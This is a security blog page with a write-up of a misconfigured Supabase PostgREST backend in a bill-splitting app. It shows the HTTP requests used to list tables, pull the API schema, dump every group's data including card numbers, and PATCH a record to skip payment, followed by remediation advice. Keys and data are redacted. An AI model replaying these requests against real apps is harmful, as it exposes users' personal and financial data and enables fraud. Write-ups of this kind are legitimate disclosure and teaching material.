<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Supabase PostgREST API Information Disclosure - GhostFlagged Blog</title>
  <link rel="stylesheet" href="../style.css">
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
</head>
<body>
  <div class="container">
    <!-- Sidebar -->
    <aside class="sidebar">
      <div class="profile-section">
        <div class="profile-pic">
          <img src="../033c6a1e8ca3ad18b0e6ac169604c66b.jpg" alt="Profile Picture" id="profile-img">
        </div>
        <h1>GhostFlagged</h1>
        <p class="tagline">My personal space for writing and sharing ideas.</p>
      </div>
      
      <div class="bio-section">
        <h3>Bio</h3>
        <p>Security researcher and CTF enthusiast. Passionate about web application security, vulnerability research, and sharing knowledge through writeups and tools.</p>
      </div>
      
      <div class="contact-section">
        <h3>Contact</h3>
        <a href="mailto:your.email@example.com" class="email-link">your.email@example.com</a>
      </div>

      <nav class="sidebar-nav">
        <a href="../index.html#posts" class="nav-link">Posts</a>
      </nav>

      <footer class="sidebar-footer">
        <p>&copy; 2025 GhostFlagged</p>
      </footer>
    </aside>

    <!-- Main Content -->
    <main class="main-content">
      <article class="post-content">
        <a href="../index.html" class="back-link">← Back to Home</a>
        <div class="post-title-header">
          <span class="post-category category-posts">Posts</span>
          <h1>Supabase PostgREST API Information Disclosure</h1>
        </div>
        <p class="post-meta">Published on January 2025</p>
        <div class="post-body">
          <p>I was working on an application that allows users to divide the cost of something with other people who participate in that party or event. Users can create a group, add members, and input card numbers. They can also claim the group name using a subscription. Here's what I found in this application.</p>

          <h2>What I Did to Find It</h2>
          
          <p>I fired up Burp Suite, added the target to the scope, and started checking the website. I soon found out that most actions were client-side based, but I was sure there must be some actions that require the client to send requests to the server, such as creating a group. This seemed odd to me.</p>

          <p>I opened my browser and discovered I was missing something important—the application was sending requests to the server, but they were going to a different domain (services like Firebase/Supabase). I quickly added it to Burp and checked the requests, finding some interesting data.</p>

          <h3>Initial Discovery</h3>
          
          <p>Here is one of the requests I intercepted:</p>

          <pre class="code-block"><code>GET /rest/v1/security_settings?select=* HTTP/1.1
Host: [REDACTED_SUPABASE].supabase.co
Sec-Ch-Ua-Platform: "macOS"
Authorization: Bearer [REDACTED_TOKEN]
Sec-Ch-Ua: "Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
X-Client-Info: supabase-js-web/2.80.0
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Accept: application/vnd.pgrst.object+json
Accept-Profile: public
Apikey: [REDACTED_API_KEY]
Origin: https://[REDACTED_DOMAIN].netlify.app
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://[REDACTED_DOMAIN].netlify.app/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Priority: u=1, i
Connection: keep-alive</code></pre>

          <p>And here is the response:</p>

          <pre class="code-block"><code>HTTP/2 404 Not Found
Date: Sat, 15 Nov 2025 21:16:08 GMT
Content-Type: application/json; charset=utf-8
Server: cloudflare
Cf-Ray: [REDACTED]
Cf-Cache-Status: DYNAMIC
Access-Control-Allow-Origin: https://[REDACTED_DOMAIN].netlify.app
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
Vary: Accept-Encoding
Access-Control-Expose-Headers: Content-Encoding, Content-Location, Content-Range, Content-Type, Date, Location, Server, Transfer-Encoding, Range-Unit
Proxy-Status: PostgREST; error=PGRST205
Sb-Gateway-Version: 1
Sb-Project-Ref: [REDACTED]
Sb-Request-Id: [REDACTED]
X-Content-Type-Options: nosniff
X-Envoy-Attempt-Count: 1
X-Envoy-Upstream-Service-Time: 26
Set-Cookie: [REDACTED]
Alt-Svc: h3=":443"; ma=86400

{
  "code": "PGRST205",
  "details": null,
  "hint": "Perhaps you meant the table 'public.super_admins'",
  "message": "Could not find the table 'public.security_settings' in the schema cache"
}</code></pre>

          <h2>Understanding PostgREST</h2>
          
          <p>The first thing that came to mind was searching for the error code on Google. I found out they were using something called <strong>PostgREST</strong>. I started reading the documentation—it basically turns the database into REST endpoints. I began exploring the API and found the Swagger/OpenAPI data in JSON format.</p>

          <h3>Discovering the OpenAPI Schema</h3>
          
          <p>I was able to retrieve the OpenAPI/Swagger schema that revealed the entire database structure:</p>

          <pre class="code-block"><code>GET /rest/v1/ HTTP/1.1
Host: [REDACTED_SUPABASE].supabase.co
[Headers similar to above]

HTTP/2 200 OK
Content-Type: application/openapi+json; charset=utf-8
[Response headers...]

{
  "swagger": "2.0",
  "info": {
    "description": "",
    "title": "standard public schema",
    "version": "13.0.5"
  },
  "host": "[REDACTED_SUPABASE].supabase.co:443",
  "basePath": "/",
  "schemes": ["https"],
  "paths": {
    "/groups": {
      "get": {
        "parameters": [...],
        "responses": {
          "200": {
            "description": "OK",
            "schema": {
              "items": {"$ref": "#/definitions/groups"},
              "type": "array"
            }
          }
        },
        "tags": ["groups"]
      },
      "post": {...},
      "delete": {...},
      "patch": {...}
    },
    "/rpc/cleanup_expired_groups": {
      "post": {...}
    }
  },
  "definitions": {
    "groups": {
      "required": ["id", "short_id", "group_id", "name", "creator", "members", "items", "created_at", "updated_at"],
      "properties": {
        "id": {"format": "bigint", "type": "integer"},
        "short_id": {"format": "character varying", "maxLength": 50, "type": "string"},
        "group_id": {"format": "character varying", "maxLength": 100, "type": "string"},
        "name": {"format": "character varying", "maxLength": 255, "type": "string"},
        "creator": {"format": "character varying", "maxLength": 255, "type": "string"},
        "members": {"format": "jsonb"},
        "items": {"format": "jsonb"},
        "tax": {"default": 0, "format": "numeric", "type": "number"},
        "tip": {"default": 0, "format": "numeric", "type": "number"},
        "creator_message": {"format": "text", "type": "string"},
        "member_links": {"format": "jsonb"},
        "is_finalized": {"format": "boolean", "default": false},
        "visits": {"format": "jsonb"},
        "source": {"format": "character varying", "maxLength": 50, "type": "string"},
        "created_at": {"format": "bigint", "type": "integer"},
        "updated_at": {"format": "bigint", "type": "integer"}
      },
      "type": "object"
    }
  }
}</code></pre>

          <h2>Exploiting the Vulnerability</h2>
          
          <p>From the Swagger data, I found the groups endpoint. I then made a request to retrieve all groups:</p>

          <pre class="code-block"><code>GET /rest/v1/groups HTTP/2
Host: [REDACTED_SUPABASE].supabase.co
Authorization: Bearer [REDACTED_TOKEN]
Apikey: [REDACTED_API_KEY]
Accept: application/vnd.pgrst.object+json
Accept-Profile: public
Origin: https://[REDACTED_DOMAIN].netlify.app
[Other headers...]</code></pre>

          <h3>Information Disclosure</h3>
          
          <p>The API was leaking data for all users in JSON format. The response included sensitive information such as:</p>

          <ul>
            <li>Group IDs and short IDs</li>
            <li>Creator names and member names</li>
            <li>Group items and financial details (tax, tip, amounts)</li>
            <li>Member links with personal information</li>
            <li>Card numbers (PII - Personally Identifiable Information)</li>
            <li>Member notes and messages</li>
            <li>Visit tracking data</li>
            <li>Timestamps for creation and updates</li>
          </ul>

          <p><strong>Note:</strong> The actual response data containing user information has been redacted to protect user privacy.</p>

          <h2>Escalation: Unauthorized Data Modification</h2>
          
          <p>After discovering the information disclosure vulnerability, the next question was: can we make changes to the data? The answer is <strong>yes</strong>—using PATCH requests, we can modify data in the database.</p>

          <h3>Accessing Reserved Groups</h3>
          
          <p>I discovered another endpoint for reserved groups. Here's the request to retrieve all reserved groups:</p>

          <pre class="code-block"><code>GET /rest/v1/reserved_groups?select=* HTTP/2
Host: [REDACTED_SUPABASE].supabase.co
Accept: */*
Access-Control-Request-Method: GET
Access-Control-Request-Headers: accept-profile,apikey,authorization,x-client-info
Origin: https://[REDACTED_DOMAIN].netlify.app
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Sec-Fetch-Mode: cors
Sec-Fetch-Site: cross-site
Sec-Fetch-Dest: empty
Referer: https://[REDACTED_DOMAIN].netlify.app/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Priority: u=1, i
Apikey: [REDACTED_API_KEY]
Content-Length: 2</code></pre>

          <p>And the response:</p>

          <pre class="code-block"><code>HTTP/2 200 OK
Date: Thu, 13 Nov 2025 09:05:53 GMT
Content-Type: application/json; charset=utf-8
Server: cloudflare
Content-Range: 0-0/*
Cf-Ray: [REDACTED]
Cf-Cache-Status: DYNAMIC
Access-Control-Allow-Origin: https://[REDACTED_DOMAIN].netlify.app
Content-Location: /reserved_groups?select=%2A
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
Vary: Accept-Encoding
Access-Control-Expose-Headers: Content-Encoding, Content-Location, Content-Range, Content-Type, Date, Location, Server, Transfer-Encoding, Range-Unit
Content-Profile: public
Sb-Gateway-Version: 1
Sb-Project-Ref: [REDACTED]
Sb-Request-Id: [REDACTED]
X-Content-Type-Options: nosniff
X-Envoy-Attempt-Count: 1
X-Envoy-Upstream-Service-Time: 113
Set-Cookie: [REDACTED]
Alt-Svc: h3=":443"; ma=86400

[Response data containing reserved group information - redacted for privacy]</code></pre>

          <h3>Modifying Database Values</h3>
          
          <p>Using PATCH requests, I was able to modify values in the database. Here's an example of changing a reserved group's status:</p>

          <pre class="code-block"><code>PATCH /rest/v1/reserved_groups?select=*&id=eq.1 HTTP/2
Host: [REDACTED_SUPABASE].supabase.co
Accept: */*
Access-Control-Request-Method: GET
Access-Control-Request-Headers: accept-profile,apikey,authorization,x-client-info
Origin: https://[REDACTED_DOMAIN].netlify.app
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Sec-Fetch-Mode: cors
Sec-Fetch-Site: cross-site
Sec-Fetch-Dest: empty
Referer: https://[REDACTED_DOMAIN].netlify.app/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Priority: u=1, i
Apikey: [REDACTED_API_KEY]
Content-Length: 328

[Request body with modified data - redacted]</code></pre>

          <p>This PATCH request successfully modified the database record, changing the <code>is_active</code> status from <code>false</code> to <code>true</code>, demonstrating that not only could I read all data, but I could also modify it without proper authorization.</p>

          <h3>Impact of Unauthorized Modifications</h3>
          
          <p>The ability to modify data through PATCH requests opens up several attack vectors:</p>

          <ul>
            <li><strong>Data Manipulation:</strong> Attackers could modify group names, member information, and financial data</li>
            <li><strong>Subscription Fraud:</strong> Changing reservation statuses and expiration dates could enable subscription fraud</li>
            <li><strong>Business Logic Bypass:</strong> Modifying <code>is_active</code> flags could bypass payment verification</li>
            <li><strong>Data Integrity:</strong> Unauthorized modifications compromise the integrity of all stored data</li>
            <li><strong>Financial Impact:</strong> Changes to pricing, payment status, and reservations could have direct financial consequences</li>
          </ul>

          <h2>Proof of Concept</h2>
          
          <p>The following demonstrates the vulnerability in action:</p>

          <div class="video-container">
            <video controls preload="metadata">
              <source src="../poc/supabase-postgrest-poc.mp4" type="video/mp4">
              Your browser does not support the video tag.
            </video>
          </div>

          <p><em>Note: If you have screenshots or additional POC materials, they can be added here.</em></p>

          <h2>Root Cause Analysis</h2>
          
          <ul>
            <li><strong>Exposed PostgREST API:</strong> The Supabase PostgREST API was accessible without proper authentication checks</li>
            <li><strong>Weak Authorization:</strong> The API key and JWT token used for authentication were client-side accessible and could be extracted</li>
            <li><strong>Missing Row-Level Security (RLS):</strong> The database tables likely lacked proper Row-Level Security policies to restrict access</li>
            <li><strong>OpenAPI Schema Exposure:</strong> The OpenAPI/Swagger endpoint revealed the entire database structure, making it easier to enumerate endpoints</li>
            <li><strong>No Rate Limiting:</strong> The API allowed unlimited requests without rate limiting, enabling data extraction</li>
          </ul>

          <h2>Impact</h2>
          
          <p>This vulnerability had severe consequences:</p>

          <ul>
            <li><strong>Mass Data Exposure:</strong> All user groups and associated data were accessible</li>
            <li><strong>PII Leakage:</strong> Personal information including names, card numbers, and financial details were exposed</li>
            <li><strong>Privacy Violation:</strong> User privacy was completely compromised</li>
            <li><strong>Financial Information:</strong> Payment card numbers and transaction details were accessible</li>
            <li><strong>User Enumeration:</strong> Attackers could enumerate all users and their relationships</li>
            <li><strong>Unauthorized Data Modification:</strong> Attackers could modify any data in the database using PATCH requests</li>
            <li><strong>Business Logic Manipulation:</strong> Critical flags and status fields could be changed, bypassing application logic</li>
            <li><strong>Subscription Fraud:</strong> Reservation and subscription data could be manipulated without authorization</li>
          </ul>

          <h2>Remediation Recommendations</h2>
          
          <ol>
            <li><strong>Implement Row-Level Security (RLS):</strong> Enable and properly configure RLS policies in Supabase to restrict data access based on user roles</li>
            <li><strong>Server-Side Authentication:</strong> Move API keys and sensitive tokens to server-side only, never expose them in client-side code</li>
            <li><strong>Proper Authorization:</strong> Implement proper authorization checks before allowing access to database endpoints</li>
            <li><strong>Write Protection:</strong> Implement strict write controls—PATCH, POST, DELETE operations should require additional authentication</li>
            <li><strong>Disable OpenAPI Endpoint:</strong> Disable or restrict access to the OpenAPI schema endpoint in production</li>
            <li><strong>Rate Limiting:</strong> Implement rate limiting on all API endpoints to prevent automated data extraction and modification</li>
            <li><strong>Input Validation:</strong> Validate and sanitize all inputs to prevent injection attacks and unauthorized modifications</li>
            <li><strong>Audit Logging:</strong> Implement comprehensive audit logging to detect unauthorized access attempts and data modifications</li>
            <li><strong>Data Encryption:</strong> Encrypt sensitive data at rest and in transit</li>
            <li><strong>Change Detection:</strong> Implement change tracking and alerts for critical data modifications</li>
            <li><strong>Regular Security Audits:</strong> Conduct regular security audits and penetration testing</li>
          </ol>

          <h2>Key Takeaways</h2>
          
          <ul>
            <li><strong>Third-Party Services:</strong> When using third-party services like Supabase, ensure proper security configuration</li>
            <li><strong>Client-Side Secrets:</strong> Never expose API keys, tokens, or secrets in client-side code</li>
            <li><strong>Database Security:</strong> Always enable and properly configure Row-Level Security when using PostgREST</li>
            <li><strong>Read vs Write Access:</strong> Information disclosure vulnerabilities can often be escalated to unauthorized data modification if write operations aren't properly protected</li>
            <li><strong>API Design:</strong> Design APIs with security in mind from the start, not as an afterthought</li>
            <li><strong>Information Disclosure:</strong> Error messages and API schemas can reveal sensitive information about the system architecture</li>
            <li><strong>Write Operations:</strong> PATCH, POST, and DELETE operations should have stricter authorization than read operations</li>
            <li><strong>Defense in Depth:</strong> Implement multiple layers of security controls</li>
            <li><strong>Business Logic Protection:</strong> Critical business logic flags and status fields must be protected from unauthorized modification</li>
          </ul>

          <p><em>Note: All sensitive information including domains, API keys, tokens, and user data has been redacted to protect the affected organization and users.</em></p>
        </div>
      </article>
    </main>
  </div>
</body>
</html>

